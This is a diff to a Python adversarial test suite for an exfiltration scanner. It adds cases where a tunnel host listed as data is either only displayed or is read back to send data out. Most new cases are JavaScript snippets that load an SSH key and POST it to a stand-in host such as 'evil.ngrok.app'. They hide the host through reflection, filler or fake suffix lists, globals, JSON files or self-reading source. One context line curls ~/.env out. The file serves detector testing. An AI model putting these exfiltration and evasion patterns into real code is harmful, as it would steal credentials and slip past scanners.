@@ -14,6 +14,13 @@ its attack twins (must stay Do not connect):
 * (c) a request-bin host inside a regex / pattern string array is a signature. Twins:
   the same script also posts to that host, builds a URL from an element, hands the
   array to a sender, or another file sources the script and sends.
+* (d) a tunnel host listed as data (a prompt placeholder, an "e.g." example, a bundled
+  Public Suffix List, a host-allowlist suffix) is low only while the key / variable /
+  list holding it never reaches a network call. Twins: each shape read back and used
+  as the fetch host, and a long filler list (with or without fake suffix-list markers)
+  hiding the host; also the holder read without its name (code on the literal's own
+  lines, a call into the package's own code, a path / iteration / global, a JSON data
+  file, a file or function whose source text is read).
 
 Run from a repo export:
     cd <tree> && python -I tests/adversarial/cases_exfil_precision.py [case ...]
@@ -218,6 +225,40 @@ if __name__ == "__main__":
     print(scan(sys.stdin.read()))
 '''
 
+# ── (d) tunnel host listed as data ───────────────────────────────────────────────────
+# A neutral payload, so each twin's label rests on the tunnel-host rule alone (no
+# credential-read or sensitive-POST rule to catch it first).
+SSH = "const sshKey = loadKey();\n"
+POST_KEY = ", {method: 'POST', body: sshKey});\n"
+FILLER = [f"host{i}.example.app" for i in range(240)]
+
+
+def host_list(extra, holder="const L = ["):
+    body = "".join(f'  "{h}",\n' for h in FILLER[:120] + extra + FILLER[120:])
+    return holder + "\n" + body + "];\n"
+
+
+def PSL_BODY(opener):  # noqa: N802 - reads as a constant
+    """A fake suffix list long enough to pass for a bundled one, its markers first."""
+    hosts = ["*.ck", "!www.ck"] + FILLER[:220] + ["evil.ngrok.io"]
+    return opener + "\n" + "".join(f'  "{h}",\n' for h in hosts)
+
+
+FIND_SEND = ("fetch('https://' + lists().find((h) => h.startsWith('evil')) + '/c'"
+             + POST_KEY)
+
+
+TUNNEL_DATA_OK = (
+    "const r = await fetch(location.href" + ", {cache: 'no-store'});\n"
+    "const answer = await ui.text({\n"
+    "  message: 'Reserved tunnel domain (leave blank for an ephemeral URL)',\n"
+    "  placeholder: 'acme.ngrok.app',\n"
+    "  validate: (v) => (!v.trim() ? undefined : 'enter a bare hostname, e.g. acme.ngrok.app'),\n"
+    "});\nif (answer === CANCEL) process.exitCode = 1;\n"
+    "const server = {\n  allowedHosts: options.allowedHosts ?? [\n"
+    "    \".ngrok.io\",\n    \".trycloudflare.com\",\n  ],\n};\n")
+
+
 CASES = {
     # (a) controls
     "ctl_env_key_vendor_vj": pkg({"server.py": VJ_HEAD}),
@@ -335,6 +376,137 @@ CASES = {
         "send.sh": '#!/usr/bin/env bash\nsource ./guard.sh\n'
                    'curl -s -d "$(cat ~/.env)" "https://${CREDENTIAL_EXFIL[2]}"\n',
     }, main="send.sh"),
+    # (d) control: placeholder, example and allowlist suffix that are only shown/matched
+    "ctl_tunnel_host_shown_not_sent": pkg({"index.js": TUNNEL_DATA_OK}, main="index.js"),
+    # (d) twins
+    "tunnel_placeholder_used_as_fetch_host": pkg({"index.js": SSH + (
+        "const o = {\n  message: 'Reserved tunnel domain',\n  placeholder: 'evil.ngrok.app',\n};\n"
+        "fetch(`https://${o.placeholder}/c`" + POST_KEY)}, main="index.js"),
+    "tunnel_example_split_to_fetch_host": pkg({"index.js": SSH + (
+        "const hint = 'enter a bare hostname, e.g. evil.ngrok.app';\n"
+        "const host = hint.split('e.g. ')[1];\n"
+        "fetch('https://' + host + '/c'" + POST_KEY)}, main="index.js"),
+    "tunnel_host_hidden_in_filler_list": pkg({"index.js": SSH + host_list(["evil.ngrok.io"]) + (
+        "fetch('https://' + L.find((h) => h.startsWith('evil')) + '/c'" + POST_KEY)},
+        main="index.js"),
+    "tunnel_host_in_fake_suffix_list_sent": pkg({"index.js": SSH + host_list(
+        ["*.ck", "!www.ck", "evil.ngrok.io"]) + "send(L);\n"
+        "function send(list) { return fetch('https://' + list[122] + '/c'" + POST_KEY.rstrip(";\n")
+        + "; }\n"}, main="index.js"),
+    "suffix_allowlist_used_as_destination": pkg({"index.js": SSH + (
+        "const cfg = {\n  allowedHosts: [\n    \".ngrok.io\",\n    \".trycloudflare.com\",\n"
+        "  ],\n};\nfetch('https://x' + cfg.allowedHosts[0]" + POST_KEY)}, main="index.js"),
+    # (d) twins that read the holder without naming it: reflection, a helper's return
+    # value, an export, `this`, the file's own source.
+    "tunnel_placeholder_returned_and_reflected": pkg({"index.js": SSH + (
+        "function cfg() {\n  return {\n    placeholder: 'evil.ngrok.app',\n  };\n}\n"
+        "fetch('https://' + Object.values(cfg())[0] + '/c'" + POST_KEY)}, main="index.js"),
+    "suffix_allowlist_reflected_to_destination": pkg({"index.js": SSH + (
+        "const cfg = {\n  allowedHosts: [\n    \".ngrok.io\",\n    \".trycloudflare.com\",\n"
+        "  ],\n};\nfetch('https://x' + Object.values(cfg)[0][0]" + POST_KEY)}, main="index.js"),
+    "fake_suffix_list_reflected_to_destination": pkg({"index.js": SSH + host_list(
+        ["*.ck", "!www.ck", "evil.ngrok.io"], holder="const rules = {\n  psl: [")
+        .replace("];\n", "],\n};\n") + (
+        "fetch('https://' + Object.values(rules)[0].find((h) => h.startsWith('evil')) + '/c'"
+        + POST_KEY)}, main="index.js"),
+    "fake_suffix_list_returned_from_helper": pkg({"index.js": SSH + "function rules() {\n  return "
+        + host_list(["*.ck", "!www.ck", "evil.ngrok.io"], holder="{\n  psl: [")
+        .replace("];\n", "],\n};\n") + "}\n" + (
+        "fetch('https://' + Object.values(rules())[0].find((h) => h.startsWith('evil')) + '/c'" + POST_KEY)},
+        main="index.js"),
+    "tunnel_placeholder_exported_to_other_file": pkg({
+        "opts.js": "module.exports = {\n  placeholder: 'evil.ngrok.app',\n};\n",
+        "index.js": SSH + "fetch('https://' + require('./opts').placeholder + '/c'" + POST_KEY,
+    }, main="index.js"),
+    "tunnel_example_on_this_reflected": pkg({"index.js": SSH + (
+        "class Wizard {\n  setup() {\n    this.tips = {\n"
+        "      host: 'enter a bare hostname, e.g. evil.ngrok.app',\n    };\n  }\n"
+        "  go() {\n    const h = Object.values(this.tips)[0].split('e.g. ')[1];\n"
+        "    fetch('https://' + h + '/c'" + POST_KEY.rstrip("\n") + "\n  }\n}\n"
+        "const w = new Wizard();\nw.setup();\nw.go();\n")}, main="index.js"),
+    "tunnel_host_read_from_own_source": pkg({"index.js": SSH + (
+        "const fs = require('fs');\n"
+        "const o = { placeholder: 'evil.ngrok.app' };\n"
+        "const host = fs.readFileSync(__filename, 'utf8').match(/[a-z]+[.]ngrok[.]app/)[0];\n"
+        "fetch('https://' + host + '/c'" + POST_KEY)}, main="index.js"),
+    # (d) second round of #379 review: code on the literal's own lines, a literal handed
+    # to this package's own code, a holder read through a path / iteration / global, a
+    # data file, and a file whose text is read.
+    "fake_suffix_list_returned_by_name": pkg({"index.js": SSH + "function lists() {\n"
+        + PSL_BODY("  const PSL = [") + "  ];\n  return PSL;\n}\n" + FIND_SEND}, main="index.js"),
+    "fake_suffix_list_returned_on_closing_line": pkg({"index.js": SSH + "function lists() {\n"
+        + PSL_BODY("  const PSL = [") + "  ]; return PSL;\n}\n" + FIND_SEND}, main="index.js"),
+    "fake_suffix_list_aliased_on_closing_line": pkg({"index.js": SSH
+        + PSL_BODY("const PSL = [") + "], Q = PSL;\nconst lists = () => Q;\n" + FIND_SEND},
+        main="index.js"),
+    "fake_suffix_list_in_local_cjs_wrapper": pkg({"index.js": SSH + (
+        "function __commonJS(cb) { const m = { exports: {} }; cb[Object.keys(cb)[0]]({}, m); "
+        "fetch('https://' + m.exports.find((h) => h.startsWith('evil')) + '/c'"
+        + POST_KEY.rstrip(";\n") + "); }\n"
+        "var require_rules = __commonJS({ \"node_modules/psl/data/rules.json\"(exports, module) {\n")
+        + PSL_BODY("\tmodule.exports = [") + "\t];\n} });\n"}, main="index.js"),
+    "tunnel_placeholder_aliased_on_same_line": pkg({"index.js": SSH + (
+        "const o = { placeholder: 'evil.ngrok.app' }, h = o.placeholder;\n"
+        "fetch('https://' + h + '/c'" + POST_KEY)}, main="index.js"),
+    "tunnel_placeholder_inline_to_local_reflector": pkg({"index.js": SSH + (
+        "show({ placeholder: 'evil.ngrok.app' });\n"
+        "function show(o) { fetch('https://' + Object.values(o)[0] + '/c'"
+        + POST_KEY.rstrip(";\n") + "; }\n")}, main="index.js"),
+    "tunnel_placeholder_passed_to_local_reflector": pkg({"index.js": SSH + (
+        "show({\n  message: 'Tunnel',\n  placeholder: 'evil.ngrok.app',\n});\n"
+        "function show(o) { for (const k in o) fetch('https://' + o[k] + '/c'"
+        + POST_KEY.rstrip(";\n") + "; }\n")}, main="index.js"),
+    "tunnel_placeholder_to_local_method": pkg({"index.js": SSH + (
+        "const ui = { text: (o) => fetch('https://' + Object.values(o)[0] + '/c'"
+        + POST_KEY.rstrip(";\n") + ") };\nui.text({\n  placeholder: 'evil.ngrok.app',\n});\n")},
+        main="index.js"),
+    "tunnel_placeholder_to_local_constructor": pkg({"index.js": SSH + (
+        "new Wiz({\n  placeholder: 'evil.ngrok.app',\n});\n"
+        "function Wiz(o) { fetch('https://' + Object.values(o)[0] + '/c'"
+        + POST_KEY.rstrip(";\n") + "; }\n")}, main="index.js"),
+    "suffix_allowlist_passed_to_local_function": pkg({"index.js": SSH + (
+        "createServer({\n  allowedHosts: [\n    \".ngrok.io\",\n    \".trycloudflare.com\",\n"
+        "  ],\n});\nfunction createServer(c) { fetch('https://evil' + Object.values(c)[0][0]"
+        + POST_KEY.rstrip(";\n") + "; }\n")}, main="index.js"),
+    "tunnel_placeholder_iterated_in_object_list": pkg({"index.js": SSH + (
+        "const steps = [\n  {\n    placeholder: 'evil.ngrok.app',\n  },\n];\n"
+        "steps.forEach((s) => fetch('https://' + Object.values(s)[0] + '/c'"
+        + POST_KEY.rstrip(";\n") + "));\n")}, main="index.js"),
+    "tunnel_placeholder_nested_object_reflected": pkg({"index.js": SSH + (
+        "const all = {\n  ui: {\n    placeholder: 'evil.ngrok.app',\n  },\n};\n"
+        "const vs = Object.values(all.ui);\nfetch('https://' + vs[0] + '/c'" + POST_KEY)},
+        main="index.js"),
+    "tunnel_placeholder_set_on_global": pkg({
+        "opts.js": "globalThis.cfg = {\n  placeholder: 'evil.ngrok.app',\n};\n",
+        "index.js": "require('./opts.js');\n" + SSH
+                    + "fetch('https://' + cfg.placeholder + '/c'" + POST_KEY,
+    }, main="index.js"),
+    "tunnel_placeholder_classic_script_global": pkg({
+        "opts.js": "var cfg = {\n  placeholder: 'evil.ngrok.app',\n};\n",
+        "index.js": SSH + "fetch('https://' + cfg.placeholder + '/c'" + POST_KEY,
+    }, main="index.js"),
+    "tunnel_placeholder_in_json_data_file": pkg({
+        "hosts.json": "{\"placeholder\": \"evil.ngrok.app\"}\n",
+        "index.js": SSH + "const fs = require('fs');\n"
+                    "const h = JSON.parse(fs.readFileSync(__dirname + '/hosts.json')).placeholder;\n"
+                    "fetch('https://' + h + '/c'" + POST_KEY,
+    }, main="index.js"),
+    "tunnel_placeholder_file_read_by_other_file": pkg({
+        "opts.js": "const o = {\n  placeholder: 'evil.ngrok.app',\n};\n",
+        "index.js": SSH + "const fs = require('fs');\nconst host = fs.readFileSync("
+                    "require.resolve('./opts'), 'utf8').match(/[a-z]+[.]ngrok[.]app/)[0];\n"
+                    "fetch('https://' + host + '/c'" + POST_KEY,
+    }, main="index.js"),
+    "tunnel_placeholder_read_via_runtime_path": pkg({"index.js": SSH + (
+        "const fs = require('fs');\nconst path = require('path');\n"
+        "const o = { placeholder: 'evil.ngrok.app' };\n"
+        "const me = path.join(__dirname, 'index.js');\n"
+        "const host = fs.readFileSync(me, 'utf8').match(/[a-z]+[.]ngrok[.]app/)[0];\n"
+        "fetch('https://' + host + '/c'" + POST_KEY)}, main="index.js"),
+    "tunnel_placeholder_function_source_read": pkg({"index.js": SSH + (
+        "function cfg() {\n  const o = { placeholder: 'evil.ngrok.app' };\n  return 1;\n}\n"
+        "const host = cfg.toString().match(/[a-z]+[.]ngrok[.]app/)[0];\n"
+        "fetch('https://' + host + '/c'" + POST_KEY)}, main="index.js"),
 }
 
 
